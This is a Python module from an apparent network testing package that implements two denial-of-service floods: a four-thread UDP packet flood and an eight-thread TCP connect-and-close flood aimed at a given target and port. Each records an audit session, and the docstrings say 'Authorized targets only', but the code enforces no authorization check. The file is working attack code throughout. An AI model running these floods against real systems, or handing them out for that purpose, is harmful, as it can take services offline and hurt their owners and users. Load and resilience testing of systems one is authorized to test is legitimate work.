"""UDP/TCP flood — attack simulation. Authorized targets only."""

import socket
import threading
import time
from typing import Callable

from udp_probe.attack.audit import log_attack_session, end_attack_session


def run_udp_flood(
    target: str,
    port: int,
    duration_sec: float = 10.0,
    payload: bytes | None = None,
    operator: str | None = None,
) -> int:
    """Run UDP flood toward target:port for duration_sec. Returns attack_session id."""
    session_id = log_attack_session(
        "udp_flood", target, port=port,
        params={"duration_sec": duration_sec, "payload_len": len(payload or b"")},
        operator=operator,
    )
    stop = threading.Event()
    payload = payload or b"\x00" * 64

    def send_loop() -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            while not stop.is_set():
                sock.sendto(payload, (target, port))
        finally:
            sock.close()

    threads = [threading.Thread(target=send_loop, daemon=True) for _ in range(4)]
    for t in threads:
        t.start()
    try:
        time.sleep(duration_sec)
    finally:
        stop.set()
        for t in threads:
            t.join(timeout=2.0)
        end_attack_session(session_id)
    return session_id


def run_tcp_flood(
    target: str,
    port: int,
    duration_sec: float = 10.0,
    operator: str | None = None,
) -> int:
    """Run TCP SYN-style flood (connect and close). Authorized targets only."""
    session_id = log_attack_session(
        "tcp_flood", target, port=port,
        params={"duration_sec": duration_sec},
        operator=operator,
    )
    stop = threading.Event()

    def connect_loop() -> None:
        while not stop.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.0)
                s.connect((target, port))
                s.close()
            except (socket.error, OSError):
                pass

    threads = [threading.Thread(target=connect_loop, daemon=True) for _ in range(8)]
    for t in threads:
        t.start()
    try:
        time.sleep(duration_sec)
    finally:
        stop.set()
        for t in threads:
            t.join(timeout=2.0)
        end_attack_session(session_id)
    return session_id
